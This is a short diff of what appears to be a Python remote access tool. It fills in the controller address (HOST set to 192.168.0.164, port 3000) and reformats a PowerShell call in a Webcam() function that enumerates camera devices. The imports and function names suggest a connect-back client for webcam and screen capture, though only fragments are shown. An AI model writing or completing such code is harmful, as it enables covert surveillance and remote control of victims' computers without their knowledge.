@@ -2,7 +2,7 @@ import socket, subprocess, os, time, platform, sys, pyscreeze, urllib.request, c
 from io import StringIO
 
 # Socket Properties
-HOST = ""
+HOST = "192.168.0.164"
 PORT = 3000
 
 # Defines (Send & Recv) Functions for use
@@ -103,7 +103,8 @@ def Webcam():
         del(webcam); send(b"success")
 
         try:
-            result = subprocess.check_output(["powershell.exe", "Get-WmiObject Win32_PNPEntity | Select Name | Select-String 'Camera'"], stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=12, shell=True)
+            result = subprocess.check_output(["powershell.exe", "Get-WmiObject Win32_PNPEntity | Select Name | Select-String 'Camera'"],
+                                                                      stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=12, shell=True)
             Webcam_Name = result.split(b"Name=")[1].split(b"}")[0].decode()
         except:
             Webcam_Name = "Not Found"
